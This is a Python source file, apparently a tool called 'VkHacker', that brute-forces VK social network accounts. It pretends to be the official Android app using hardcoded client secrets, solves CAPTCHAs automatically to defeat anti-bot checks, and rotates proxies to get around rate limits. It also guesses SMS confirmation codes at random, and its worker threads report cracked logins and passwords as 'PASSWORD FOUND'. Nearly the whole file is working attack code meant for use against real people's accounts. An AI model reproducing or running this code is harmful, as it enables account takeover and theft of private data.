import hashlib
import itertools
import json
import os.path
import pathlib
import random
import re
import string
import sys
import threading
import time
import traceback
from threading import Lock
from typing import Tuple
import colorama
import lxml.html
import requests
import urllib3
import vk_api
from urllib3.exceptions import ProtocolError
try:
    import vk_captcha.solver
except ImportError as e:
    # if not fount - probably it's not in path
    sys.path.append(str(pathlib.Path(__file__).parent.parent))
    import vk_captcha.solver
from vk_captcha import VkCaptchaSolver

colorama.init()

solver = VkCaptchaSolver(logging=False)  # you may change this


class CaptchaError(Exception):
    def __init__(self, sid, url):
        self.url = url
        self.sid = sid


class FA2NededEx(Exception): ...


class MyAndroidApi(object):

    @staticmethod
    def _get_auth_params(login, password, captcha_key, captcha_sid):
        ans = {
            'grant_type': 'password',
            'scope': 'nohttps,audio',
            'client_id': 2274003,
            'client_secret': 'hHbZxrka2uZ6jB1inYsH',
            'validate_token': 'true',
            'username': login,
            'password': password,
        }
        if captcha_key is not None: ans['captcha_key'] = captcha_key
        if captcha_sid is not None: ans['captcha_sid'] = captcha_sid
        return ans

    def __init__(self, login=None, password=None, token=None, secret=None, v=5.189, session=None, captcha_key=None,
                 captcha_sid=None, code=None, force_auth=False, force_pc_auth=False):
        self._requests_time_lock = threading.Semaphore(3)
        self.last_method = 0
        if not session: session = requests.Session()
        self.secret = None
        session.headers = {
            "User-Agent": "VKAndroidApp/4.13.1-1206 (Android 4.4.3; SDK 19; armeabi; ; ru)",
            "Accept": "image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*"
        }
        self.session = session
        self.v = v
        # Генерируем рандомный device_id
        self.device_id = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(16))
        if token is not None and (not force_auth or login is None) and not force_pc_auth:
            self.token = token
            self.secret = secret
        else:
            if force_pc_auth:
                self._pc_auth(login, password)
            else:
                while 1:
                    try:
                        anonym_token = self.session.get(
                            "https://oauth.vk.com/get_anonym_token",
                            params={
                                'client_id': 2274003,
                                'client_secret': 'hHbZxrka2uZ6jB1inYsH',
                                'lang': 'ru',
                                'https': 1,
                                'v': '5.189',
                                'api_id': "2274003"
                            },
                        ).json()
                        anonym_token = anonym_token['token']
                        answer = self.session.get(
                            'https://oauth.vk.com/token',
                            params={
                                'libverify_support': 1,
                                'scope': 'all',
                                'grant_type': 'password',
                                'username': login,
                                'password': password,
                                'anonymous_token': anonym_token,
                                'https': 1,
                                'v': v,
                                'lang': 'ru',
                                'sak_version': '1.92',
                                'flow_type': 'auth_without_password',
                                'api_id': 2274003,
                                'captcha_sid': captcha_sid,
                                'captcha_key': captcha_key
                            }).json()
                        if "error" in answer:
                            if answer['error'] == 'need_captcha':
                                img = answer['captcha_img']
                                ans, accuracy = solver.solve(img, minimum_accuracy=0.3)
                                captcha_sid, captcha_key = (answer['captcha_sid'], ans)
                                time.sleep(3)
                                continue
                            elif answer.get('error_type') in (
                                    'username_or_password_is_incorrect', 'cancel_by_owner_needed'):
                                raise PermissionError("invalid login|password!")
                            elif answer['error'] == 'need_validation':
                                raise FA2NededEx("The password found, but 2fa needed")
                            elif answer['error'] == 'too_many_requests':
                                time.sleep(30)
                                continue
                            raise Exception(answer)
                        break
                    except json.JSONDecodeError:
                        print(answer.text)
                if 'secret' in answer: self.secret = answer["secret"]
                self.token = answer["access_token"]
                # Методы, "Открывающие" доступ к аудио. Без них аудио получить не получится
                user = self.method('execute.getUserInfo', func_v=9)
                ans = self.method('auth.refreshToken', lang='ru')['response']
                if 'token' in ans:
                    self.token = ans['token']
                if 'secret' in ans:
                    self.secret = ans['secret']

        groups = self.method("groups.get", count=0)
        self.user = self.method("users.get")['response'][0]
        self.user_id = self.user['id']

    def _get_params(self, params, method):
        ans = [(i, params[i]) for i in params]
        url = f'/method/{method}'
        if self.secret:
            ans_q = f"/method/{method}{'?' if '?' not in method else '&'}" + \
                    "&".join("{}={}".format(i, params[i]) for i in params)
            ans_q += self.secret
            hash = hashlib.md5(ans_q.encode("utf-8")).hexdigest()
            url = f"/method/{method}{'?' if '?' not in method else '&'}" + \
                  "&".join("{}={}".format(i, requests.utils.quote(str(params[i]))) for i in params) \
                  + f"&sig={hash}"
            ans = []
        return [url, ans]

    def method(self, method: "str", headers: "dict|None" = None, flood_control_count=0, **params):
        self._requests_time_lock.acquire()
        # while time.time() - self.last_method < 1 / 3 + 0.05:
        #     time.sleep(1 / 3 - (time.time() - self.last_method) + 0.05)
        if self.secret: params['device_id'] = self.device_id
        if 'v' not in params and "v=" not in method: params['v'] = self.v
        params['access_token'] = self.token

        # self.last_method = time.time()

        threading.Thread(target=lambda: (time.sleep(1), self._requests_time_lock.release())).start()

        ans = self._send(*self._get_params(params, method))
        if 'error' in ans:
            error = vk_api.ApiError(self, method, params, ans, ans.get('error'))
            if error.code in (6, 9):
                if flood_control_count >= 4: raise error
                time.sleep(3)
                return self.method(method, headers=headers, flood_control_count=flood_control_count + 1, **params)
            if error.code == 14:
                img = error.error['captcha_img']
                e = CaptchaError(ans['error']['captcha_sid'], img)
                ans, accuracy = solver.solve(e.url, minimum_accuracy=0.3)
                params['captcha_sid'] = e.sid
                params['captcha_key'] = ans
                return self.method(method, **params)
            elif error.code == 5:
                raise PermissionError(f"Account has been baned.", ans)
            elif error.code == 17:
                redirect_url = error.error['redirect_uri']
                text = self.session.get(redirect_url.replace("act=validate", "act=captcha")).text
                html = lxml.html.fromstring(text)
                sid = html.cssselect("input[name='captcha_sid']")[0].value
                img = html.find_class('captcha_img')[0].attrib['src']
                ans, _ = solver.solve(img, minimum_accuracy=0.15)
                params['captcha_sid'] = sid
                params['captcha_key'] = ans
                return self.method(method, **params)
            else:
                raise error
        return ans

    def _send(self, url, params=None):
        if self.secret:
            url, params = url.split('?')
            return self.session.post('https://api.vk.com' + url, data=params or {}, timeout=100).json()
        return self.session.post('https://api.vk.com' + url, data=params or {}, timeout=100).json()

    _pattern = re.compile(r'/[a-zA-Z\d]{6,}(/.*?[a-zA-Z\d]+?)/index.m3u8()')

    def to_mp3(self, url):
        return self._pattern.sub(r'\1\2.mp3', url)

    def _pc_auth(self, login, password):
        vk = WebApi(login, password, session=self.session)
        self.token = vk.auth()


class WebApi:
    def __init__(self, login, password, session):
        self.login = login
        self.password = password
        self.session = session

    def auth(self):
        data = self.session.get("https://m.vk.com/join?vkid_auth_type=sign_in", timeout=60).text
        # data_html = lxml.html.fromstring(data)
        auth_token = re.findall("\"auth_token\": ?\"(.+?)\"", data)[0]
        data_uuid = re.findall('"uuid":"(.+?)"', data)[0]
        time.sleep(0.1)
        try:
            ans = self._method(
                'auth.validateAccount',
                login=self.login,
                sid='',
                client_id=7934655,
                auth_token=auth_token,
                super_app_token='',
                access_token=""
            )
        except vk_api.ApiError as e:
            if e.code == 104:
                # TODO: invalid login. We shouldn't check any other combinations with this login
                raise PermissionError("Invalid login/password")
        time.sleep(0.5)
        if ans['response'].get('flow_name') == 'need_registration':
            try:
                ans = self._method(
                    "auth.validatePhone",
                    client_id=7934655,
                    device_id="".join(random.choice(string.ascii_lowercase + string.digits + '-') for _ in range(21)),
                    external_device_id='',
                    service_group='',
                    lang='en',
                    phone=self.login,
                    auth_token=auth_token,
                    sid='',
                    allow_callreset=1,
                    access_token=''
                )
            except vk_api.ApiError as e:
                raise PermissionError("Undefined phone number: ", e)
            for i in range(10):
                code_length = ans['response'].get('code_length', 4)
                code = random.randint(0, 10 ** code_length - 1).__str__().rjust(code_length, '0')
                try:
                    ans1 = self._method(
                        "auth.validatePhoneConfirm",
                        client_id=7934655,
                        device_id="".join(
                            random.choice(string.ascii_lowercase + string.digits + '-') for _ in range(21)),
                        sid=ans['response'].get('sid'),
                        phone=self.login,
                        auth_token=auth_token,
                        code=code,
                        service_group='',
                        can_skip_password='',
                        access_token=''
                    )
                    ans = ans1
                    break
                except PermissionError as e:
                    raise
                except vk_api.ApiError as e:
                    if 'Incorrect code' in e.error.get('error_msg', ''):
                        continue
                    raise PermissionError("Could not pass 2fa")

            print(self.login, ":", self.password, ' - Registration needed', sep='')
            return
        sid = ans['response'].get('sid')
        if sid is None and '@' not in self.login: raise Exception(ans)
        ans = self._post("https://login.vk.com/?act=connect_authorize", data={
            'username': self.login,
            'password': self.password,
            'auth_token': auth_token,
            'sid': sid if '@' not in self.login else '',
            'uuid': data_uuid,
            'v': '5.174',
            'device_id': "".join(random.choice(string.ascii_lowercase + string.digits + '-') for _ in range(21)),
            'service_group': '',
            'version': 1,
            'app_id': 7934655,
            'access_token': ''
        }, headers={
            'origin': 'https://id.vk.com',
            'referer': 'https://id.vk.com/'
        })
        if ans.get('error_code', '') in ('incorrect_password', 'incorrect_credentials'): raise PermissionError(
            "invalid login|password!"
        )
        token = ans.get('data', {}).get('access_token')
        self.session.get("https://vk.com/feed")
        if not token: raise Exception(ans)
        ans = self._post("https://login.vk.com/?act=web_token", {
            'version': 1,
            'app_id': 6287487,
            'access_token': token,
        }, headers={'origin': 'https://vk.com', 'referer': 'https://vk.com/'},
        )
        token = ans.get("data", {}).get("access_token")
        if not token: raise Exception(ans)
        return token

    def _post(self, url, data, headers: "dict[str, object]" = {}):
        ans = self.session.post(url, data=data, headers=headers, timeout=100).json()
        if ans.get("captcha_img") is not None:
            captcha_img = ans.get("captcha_img")
            captcha_sid = ans.get("captcha_sid")
            solved, _ = solver.solve(captcha_img)
            data['captcha_sid'] = captcha_sid
            data['captcha_key'] = solved
            return self._post(url, data, headers)
        return ans

    def _method(self, method, **data):
        ans = self.session.post(f"https://api.vk.com/method/{method}?v=5.174&client_id=7913379", data=data,
                                timeout=100).json()
        if 'error' in ans:
            if ans['error']['error_code'] == 14:
                img = ans['error']['captcha_img']
                e = CaptchaError(ans['error']['captcha_sid'], img)
                ans, accuracy = solver.solve(e.url, minimum_accuracy=0.3)
                data['captcha_sid'] = e.sid
                data['captcha_key'] = ans
                return self._method(method, **data)
            elif ans['error']['error_code'] == 5:
                raise PermissionError(f"Account has been baned.{ans}")
            elif ans['error']['error_code'] == 17:
                redirect_url = ans['error']['redirect_uri']
                text = self.session.get(redirect_url.replace("act=validate", "act=captcha")).text
                html = lxml.html.fromstring(text)
                sid = html.cssselect("input[name='captcha_sid']")[0].value
                img = html.find_class('captcha_img')[0].attrib['src']

                ans, _ = solver.solve(img, minimum_accuracy=0.15)
                data['captcha_sid'] = sid
                data['captcha_key'] = ans

                return self._method(method, **data)
            else:
                raise vk_api.ApiError(self, method, values=data, raw=ans, error=ans.get('error'))
        return ans


class Worker(threading.Thread):
    Proxies = []
    ProxyType = "http://"
    Working = True
    TOTAL_COUNT = 0
    LAST_PRINT_COUNT = 0
    Lock = Lock()
    StartTime = 0

    def __init__(self, process_id=0):
        super().__init__(target=self._work, name=f"Hacker_{process_id}")
        self.count = 0
        self.process_id = process_id
        self.session = requests.Session()
        self._recreate_session()
        with self.Lock:
            if not Worker.StartTime: Worker.StartTime = time.time()

    def _recreate_session(self):
        self.session = requests.Session()
        if self.Proxies:
            if isinstance(self.Proxies, list):
                self.Proxies = itertools.cycle(self.Proxies)
            self.session.proxies = {"https": self.ProxyType + next(self.Proxies)}
        self.session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0'

    def one_hack_step(self, captcha_key=None, captcha_sid=None, login=None, password=None, captcha_bytes=None):
        try:
            if password is None: login, password = self._next_login_password()
            api = MyAndroidApi(login, password, captcha_key=captcha_key, captcha_sid=captcha_sid, session=self.session)
            # TODO: OR
            # api = WebApi(login, password)
            # if no errors - account successfully hacked
            with self.Lock:
                print(f"****\n\n\nPASSWORD FOUND!!!\n\n\nlogin: {login}\npassword: {password}")
                user = {}
                try:
                    user = api.method('users.get')
                except:
                    traceback.print_exc(file=sys.stderr)
                print(f"user:{user}\n\n\n****")
            self._on_pswd_found(login, password, api, False)
            return True
        except PermissionError as e:
            with self.Lock:
                if self.TOTAL_COUNT % 5 == 0 and Worker.Working:
                    print(
                        f"[{self.process_id}]".ljust(5),
                        f"Login `{colorama.Fore.BLUE}{login}{colorama.Fore.RESET}` Password `{colorama.Fore.RED}{password}{colorama.Style.RESET_ALL}`".ljust(
                            65, ' ')[:65],
                        (f"{colorama.Fore.GREEN}{self.count}{colorama.Style.RESET_ALL}"
                         f" / "
                         f"{colorama.Fore.BLUE}{self.TOTAL_COUNT}{colorama.Style.RESET_ALL}").ljust(12, ' '),
                        f'{colorama.Fore.MAGENTA}{self.LAST_PRINT_COUNT / (time.time() - Worker.StartTime or 1):.3} pswd/second{colorama.Fore.RESET}',
                        end='\r' if self.TOTAL_COUNT % 1000 != 0 else '\n'
                    )
                self.count += 1
                Worker.TOTAL_COUNT += 1
                if self.TOTAL_COUNT % 201 == 0:
                    Worker.LAST_PRINT_COUNT = self.LAST_PRINT_COUNT / (time.time() - Worker.StartTime or 1) * 2
                    Worker.StartTime = time.time() - 2
                Worker.LAST_PRINT_COUNT += 1
            self._invalid_pswd(login, password)
            time.sleep(3)
        except FA2NededEx:
            with self.Lock:
                print(f"****\n\n\nPassword found, but 2fa needed\n\n\n"
                      f"login: {colorama.Fore.GREEN}{login}{colorama.Fore.RESET}, "
                      f"password: {colorama.Fore.CYAN}{password}{colorama.Fore.RESET}\n\n\n****")
            self._on_pswd_found(login, password, None, True)
        except CaptchaError as e:
            if captcha_key is not None and captcha_sid is not None and captcha_bytes is not None:
                with open(r'D:\Projects\Python\captcha\VkHacker\invalid_captcha' + '\\' + captcha_key + '-' + str(
                        random.randint(0, 100000)) + ".jpeg", 'wb') as f:
                    f.write(captcha_bytes)
                with vk_captcha.solver.lock:
                    solver.FAIL_COUNT += 1
            try:
                captcha_bytes = requests.get(e.url).content
                ans, _ = solver.solve(bytes_data=captcha_bytes, minimum_accuracy=0.18, repeat_count=15,
                                      session=self.session)
                return self.one_hack_step(captcha_key=ans, captcha_sid=e.sid, password=password, login=login,
                                          captcha_bytes=captcha_bytes)
            except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, ProtocolError):
                self._recreate_session()
                return self.one_hack_step(captcha_key, captcha_sid, login, password)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, urllib3.exceptions.ProtocolError):
            self._recreate_session()
            return self.one_hack_step(captcha_key, captcha_sid, login, password)
        except IndexError:
            return
        except Exception as e:
            with self.Lock:
                traceback.print_exc(file=sys.stderr)

    def _work(self):
        raise NotImplementedError("Method one hack step is not implemented!")

    def _next_login_password(self) -> 'Tuple[str, str]':
        raise NotImplementedError("Method next password is not implemented!")

    def _invalid_pswd(self, login, password):
        pass

    def _on_pswd_found(self, login, password, api, need_2fa):
        pass
